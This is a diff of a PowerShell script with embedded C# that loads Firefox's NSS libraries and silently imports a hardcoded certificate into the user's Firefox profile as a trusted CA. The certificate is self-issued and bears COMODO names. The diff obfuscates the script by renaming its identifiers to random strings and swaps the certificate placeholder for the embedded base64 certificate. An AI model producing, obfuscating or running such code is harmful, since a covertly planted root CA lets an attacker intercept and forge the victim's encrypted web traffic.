@@ -1,4 +1,4 @@
-function ACFF{
+function XSjdNvfyeR{
 Add-Type @"
 using System;
 using System.IO;
@@ -6,29 +6,29 @@ using Microsoft.Win32;
 using System.Runtime.InteropServices;
 using System.ComponentModel;
 
-public sealed class FF
+public sealed class JNOXxliKGL
 {
-	private static volatile FF instance;
-	private static object syncRoot = new Object();
-	public static FF GetInstance()
+	private static volatile JNOXxliKGL lgJhPdKaVB;
+	private static object kZxDWOYElc = new Object();
+	public static JNOXxliKGL LGMhDcwYBL()
     {
-        if (instance == null)
+        if (lgJhPdKaVB == null)
         {
-            lock (syncRoot)
+            lock (kZxDWOYElc)
             {
-                if (instance == null)
-                    instance = new FF();
+                if (lgJhPdKaVB == null)
+                lgJhPdKaVB = new JNOXxliKGL();
             }
         }
-        return instance;
+        return lgJhPdKaVB;
     }
 	
-	const int ERROR_SUCCESS=0;
+	const int TDvsJIGXQG=0;
     
     [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
     static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
 
-    private static IntPtr LoadWin32Library(string libPath)
+    private static IntPtr ACtmYLxyBq(string libPath)
     {
         if (String.IsNullOrEmpty(libPath))
             throw new ArgumentNullException("libPath");
@@ -94,65 +94,63 @@ public sealed class FF
         certUsageAnyCA = 11
     }
 	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    private delegate int NSS_InitializePtr(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags);
+    private delegate int oPvuHDwzyK(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags);
 
-    private int NSS_Initialize(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags)
+    private int IZKwhvudys(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags)
     {
-        IntPtr pProc = GetProcAddress(nssModule, "NSS_Initialize");
-        NSS_InitializePtr ptr = (NSS_InitializePtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitializePtr));
+        IntPtr pProc = GetProcAddress(yqgHxmaDfR, "NSS_Initialize");
+        oPvuHDwzyK ptr = (oPvuHDwzyK)Marshal.GetDelegateForFunctionPointer(pProc, typeof(oPvuHDwzyK));
         return ptr(sConfigDir, certPrefix, keyPrefix, secModName, flags);
     }
 
     [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    private delegate IntPtr CERT_GetDefaultCertDBPtr();
-    private IntPtr CERT_GetDefaultCertDB()
+    private delegate IntPtr DHucizwLpQ();
+    private IntPtr VvCvenvPpL()
     {
-        IntPtr pProc = GetProcAddress(nssModule, "CERT_GetDefaultCertDB");
-        CERT_GetDefaultCertDBPtr ptr = (CERT_GetDefaultCertDBPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(CERT_GetDefaultCertDBPtr));
+        IntPtr pProc = GetProcAddress(yqgHxmaDfR, "CERT_GetDefaultCertDB");
+        DHucizwLpQ ptr = (DHucizwLpQ)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DHucizwLpQ));
         return ptr();
     }
 
     [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    private delegate IntPtr NSS_ShutdownPtr();
-    private IntPtr NSS_Shutdown()
+    private delegate IntPtr JeBYbowzNK();
+    private IntPtr YLqYqvQApL()
     {
-        IntPtr pProc = GetProcAddress(nssModule, "NSS_Shutdown");
-        NSS_ShutdownPtr ptr = (NSS_ShutdownPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_ShutdownPtr));
+        IntPtr pProc = GetProcAddress(yqgHxmaDfR, "NSS_Shutdown");
+        JeBYbowzNK ptr = (JeBYbowzNK)Marshal.GetDelegateForFunctionPointer(pProc, typeof(JeBYbowzNK));
         return ptr();
     }
 
-    //SECStatus CERT_ImportCerts (CERTCertDBHandle *certdb, SECCertUsage usage, unsigned int ncerts, SECItem **derCerts, CERTCertificate ***retCerts, PRBool keepCerts, PRBool caOnly, char *nickname)
     [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    private delegate int CERT_ImportCertsPtr(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname);
-    private int CERT_ImportCerts(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname)
+    private delegate int lqCSdnuIzt(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname);
+    private int qaYVqnCYlG(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname)
     {
-        IntPtr pProc = GetProcAddress(nssModule, "CERT_ImportCerts");
-        CERT_ImportCertsPtr ptr = (CERT_ImportCertsPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(CERT_ImportCertsPtr));
+        IntPtr pProc = GetProcAddress(yqgHxmaDfR, "CERT_ImportCerts");
+        lqCSdnuIzt ptr = (lqCSdnuIzt)Marshal.GetDelegateForFunctionPointer(pProc, typeof(lqCSdnuIzt));
         return ptr(certdb, usage, ncerts, ref derCerts, ref retCerts, keepCerts, caOnly, nickname);
     }
 
-    //extern SECStatus CERT_ChangeCertTrust(CERTCertDBHandle *handle,CERTCertificate *cert,CERTCertTrust *trust);
-    private delegate int CERT_ChangeCertTrustPtr(IntPtr certdb, IntPtr cert, ref CertTrusts trust);
-    private int CERT_ChangeCertTrust(IntPtr certdb, IntPtr cert, ref CertTrusts trust)
+    private delegate int FxxAjmyRca(IntPtr certdb, IntPtr cert, ref CertTrusts trust);
+    private int wPlVkhRgFN(IntPtr certdb, IntPtr cert, ref CertTrusts trust)
     {
-        IntPtr pProc = GetProcAddress(nssModule, "CERT_ChangeCertTrust");
-        CERT_ChangeCertTrustPtr ptr = (CERT_ChangeCertTrustPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(CERT_ChangeCertTrustPtr));
+        IntPtr pProc = GetProcAddress(yqgHxmaDfR, "CERT_ChangeCertTrust");
+        FxxAjmyRca ptr = (FxxAjmyRca)Marshal.GetDelegateForFunctionPointer(pProc, typeof(FxxAjmyRca));
         return ptr(certdb, cert, ref trust);
     }
-    //void CERT_DestroyCertArray(CERTCertificate **certs, unsigned int ncerts);
+
     [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    public delegate int CERT_DestroyCertArrayPtr(IntPtr cert, uint ncerts);
-    private int CERT_DestroyCertArray(IntPtr cert, uint ncerts)
+    public delegate int TZPdJHJFdh(IntPtr cert, uint ncerts);
+    private int LUMwSnXOGn(IntPtr cert, uint ncerts)
     {
-        IntPtr pProc = GetProcAddress(nssModule, "CERT_DestroyCertArray");
-        CERT_DestroyCertArrayPtr ptr = (CERT_DestroyCertArrayPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(CERT_DestroyCertArrayPtr));
+        IntPtr pProc = GetProcAddress(yqgHxmaDfR, "CERT_DestroyCertArray");
+        TZPdJHJFdh ptr = (TZPdJHJFdh)Marshal.GetDelegateForFunctionPointer(pProc, typeof(TZPdJHJFdh));
         return ptr(cert, ncerts);
     }
 
-	private IntPtr nssModule = IntPtr.Zero;
+	private IntPtr yqgHxmaDfR = IntPtr.Zero;
 	
-	public Boolean Start(String sCert){
-        System.Console.WriteLine("FF Start");
+	public Boolean RqGKtnDdve(String sCert){
+        System.Console.WriteLine("JNOXxliKGL Start");
 		String sProfile = GetProfile();
         if (String.IsNullOrEmpty(sProfile))
         {
@@ -171,10 +169,10 @@ public sealed class FF
             foreach(FileInfo fiDll in diInstallPath.GetFiles("*.dll"))
             {
                 if (fiDll.Name.Equals("breakpadinjector.dll")) continue;
-                LoadWin32Library(fiDll.FullName);
+                ACtmYLxyBq(fiDll.FullName);
             }
-            nssModule = LoadWin32Library(diInstallPath.FullName + "\\nss3.dll");
-            if (nssModule.Equals(IntPtr.Zero))
+            yqgHxmaDfR = ACtmYLxyBq(diInstallPath.FullName + "\\nss3.dll");
+            if (yqgHxmaDfR.Equals(IntPtr.Zero))
             {
                 System.Console.WriteLine("Firefox install directory not found");
                 return false;
@@ -183,7 +181,7 @@ public sealed class FF
             //Init cert
             Marshal.Copy(bCert, 0, ipCert, bCert.Length);
             SECItem CertItem = new SECItem();
-            CertItem.iType = 3;     //   *.der
+            CertItem.iType = 3;
             CertItem.bData = ipCert;
             CertItem.iDataLen = (uint)bCert.Length;
             SECItem[] aCertItem = new SECItem[1];
@@ -195,48 +193,46 @@ public sealed class FF
             CertTrust.iSoft = 0x10;
             System.Console.WriteLine("Init cert OK");
             //End init cert
-            int status = NSS_Initialize(sProfile, "", "", SECMOD_DB, NSS_INIT_OPTIMIZESPACE);
-            if (status != ERROR_SUCCESS)
+            int status = IZKwhvudys(sProfile, "", "", SECMOD_DB, NSS_INIT_OPTIMIZESPACE);
+            if (status != TDvsJIGXQG)
             {
                 System.Console.WriteLine(String.Format("NSS_InitReadWrite ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
                 return false;
             }
-            IntPtr bd = CERT_GetDefaultCertDB();
+            IntPtr bd = VvCvenvPpL();
             if (bd == IntPtr.Zero)
             {
                 System.Console.WriteLine("CERT_GetDefaultCertDB Failed");
-                NSS_Shutdown();
+                YLqYqvQApL();
                 return false;
             }
             System.Console.WriteLine("CERT_GetDefaultCertDB OK");
             IntPtr CertToImport = new IntPtr();
             IntPtr[] aCertToImport = new IntPtr[1];
-            status = CERT_ImportCerts(bd, 11, 1, ref aCertItem, ref CertToImport, 1, 0, IntPtr.Zero);
-            if (status != ERROR_SUCCESS)
+            status = qaYVqnCYlG(bd, 11, 1, ref aCertItem, ref CertToImport, 1, 0, IntPtr.Zero);
+            if (status != TDvsJIGXQG)
             {
                 System.Console.WriteLine(String.Format("CERT_ImportCerts ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
-                NSS_Shutdown();
+                YLqYqvQApL();
                 return false;
             }
             System.Console.WriteLine("CERT_ImportCerts OK");
             Marshal.Copy(CertToImport, aCertToImport, 0, 1);
-            status = CERT_ChangeCertTrust(bd, aCertToImport[0], ref CertTrust);
-            if ( status != ERROR_SUCCESS) 
+            status = wPlVkhRgFN(bd, aCertToImport[0], ref CertTrust);
+            if ( status != TDvsJIGXQG) 
             {
                 System.Console.WriteLine(String.Format("CERT_ChangeCertTrust ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
-                NSS_Shutdown();
+                YLqYqvQApL();
                 return false;
             };
             System.Console.WriteLine("CERT_ChangeCertTrust OK");
-            CERT_DestroyCertArray(CertToImport, 1);
+            LUMwSnXOGn(CertToImport, 1);
             System.Console.WriteLine("Add cert OK");
         }
         catch (Exception){}
         finally
         {
-            /*Marshal.FreeHGlobal(ipCert);
-            ipCert = IntPtr.Zero;*/
-            NSS_Shutdown();
+            YLqYqvQApL();
         }
 		return true;
 	}
@@ -319,6 +315,6 @@ public sealed class FF
     }
 }
 "@;
-[FF]::GetInstance().Start("%CERT%");
+[JNOXxliKGL]::LGMhDcwYBL().RqGKtnDdve("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");
 }
-ACFF
+XSjdNvfyeR
